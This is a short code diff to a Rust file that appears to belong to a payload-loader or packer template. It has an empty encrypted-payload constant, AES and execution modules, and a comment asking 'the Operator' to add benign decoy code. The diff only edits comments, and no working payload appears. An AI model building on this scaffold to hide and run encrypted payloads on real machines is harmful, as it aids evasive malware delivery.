@@ -1,6 +1,3 @@
-// TODO: Add all other nessesary imports from the snippets you're using here
-// The existing ones can be removed obviously, as this is exemplary code ;-)
-
 use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK};
 use windows::core::{PSTR, s};
 use std::ffi::c_void;
@@ -15,7 +12,7 @@ mod execution;
 mod aes;
 
 #[cfg(feature = "embedded")]
-const ENCPAYLOAD: &[u8] = &[];  // replace with the encrypted payload data
+const ENCPAYLOAD: &[u8] = &[];  // will be replaced with the (encrypted) payload data
 
 #[cfg(feature = "TinyAES")]
 fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
@@ -37,7 +34,7 @@ fn hex_to_bytes(hex_str: &str) -> Result<Vec<u8>, String> {
 fn main() {
 
     /*
-    For the Operator, Write some benign code that is to be executed
+    For the Operator, Write some benign code that is to be executed (Optional)
      */
 
         #[cfg(feature = "messagebox")]
